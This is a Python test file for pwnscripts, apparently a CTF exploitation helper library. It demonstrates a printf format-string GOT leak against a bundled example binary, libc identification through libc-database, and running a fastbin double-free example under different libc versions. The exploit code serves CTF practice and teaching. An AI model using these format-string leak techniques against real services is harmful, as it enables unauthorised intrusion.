'''A number of tests for pwnscripts.
This file contains tests that are too unpredictable, too burdensome to automate,
or otherwise unwanted in the automated tests for specific reasons.

This file also serves to demonstrate some of the features of pwnscripts,
showing off common use-cases and best practices.
'''
import unittest as ut
from pwnscripts import *
from os import system, path

class BinTests(ut.TestCase):
    def test_A_common_sense(self):
        # check base necessities
        for i in [2]: assert not path.isfile('%d.out'%i)
        assert path.isfile('/usr/bin/gcc')
    
    def test_libc_db(self):
        '''This example shows how pwnscripts can quickly identify a remote libc id,
        when no libc.so.6 is provided for the challenge.
        The exploit leaks the GOT table with the fsb module, and then uses libc_find to
        identify the id of the libc used.

        This test is left outside of the automated tests, because it requires a fully downloaded
        libc-database to function, which would take an unreasonably long time to initialise
        for testing purposes.
        '''
        print()
        try:
            system('./examples/2.c')    # compile the program
            context.log_level = 'warn'
            context.binary = '2.out'
            proc = {'argv':['./2.out'], 'env':{"LD_PRELOAD": "examples/ld-2.27.so examples/libc.so.6"}}
            GOT_table = ['__libc_start_main', 'printf', 'fgets']
            GOT_addrs = list(map(lambda s: context.binary.got[s], GOT_table))
            
            @context.quiet
            def printf(l:str):
                r = process(**proc)
                r.send(l)
                return r.recvline()
            with context.local(log_level='info'):   # show info for testing purposes
                buf_off = fsb.find_offset.buffer(printf, maxlen=63)

            # send a printf GOT table leak exploit
            r = process(**proc)
            payload = fsb.leak.deref_payload(buf_off, GOT_addrs)
            assert len(payload) < 64
            r.sendline(payload)
            
            # grab the leaked addresses and pass them to libc_find() for detection
            libc_addrs = map(lambda b:unpack_bytes(b,6),fsb.leak.deref_extractor(r.recvall()))
            libc_dict = dict(zip(GOT_table, libc_addrs))
            path_to_libcdb = 'libc-database'
            if not path.isdir(path_to_libcdb):
                path_to_libcdb = input("path to libc-database: ").strip()
            assert path.isdir(path_to_libcdb)
            context.libc_database = path_to_libcdb
            with context.local(log_level='info'):   # show info for testing purposes
                context.libc = context.libc_database.libc_find(libc_dict)

            # test the libc id found
            r = process(**proc)
            r.sendline(context.libc.id)
            r.recvline()
            self.assertEqual(r.recvline().strip(), b'flag{congrats}')
            
        finally:
            system('rm 2.out')
    # TODO: tests for ROP
    def test_C(self):
        ''' Run a process() with a specific libc version using libc.run_with()

        This test demonstrates how `context.binary.process()` will change behaviour
        to match `context.libc` (if it is set)
        '''
        print()
        try:
            system('./examples/fastbin_dup.c')
            context.binary = 'f.out'
            path_to_libcdb = 'libc-database'
            if not path.isdir(path_to_libcdb):
                path_to_libcdb = input("path to libc-database: ").strip()
            assert path.isdir(path_to_libcdb)
            context.libc_database = path_to_libcdb

            # This version should cause a double free Abort
            context.libc = 'libc6_2.31-0ubuntu9_amd64'
            r = context.binary.process()    # Auto run-with-libc
            r.recvall()
            self.assertEqual(r.poll(), -6)

            # This version should permit double frees
            context.libc = 'libc6_2.24-11+deb9u4_amd64'
            r = context.binary.process()    # Auto run-with-libc
            r.recvall()
            self.assertEqual(r.poll(), 0)

        finally:
            system('rm f.out')
if __name__ == '__main__':
    ut.main()
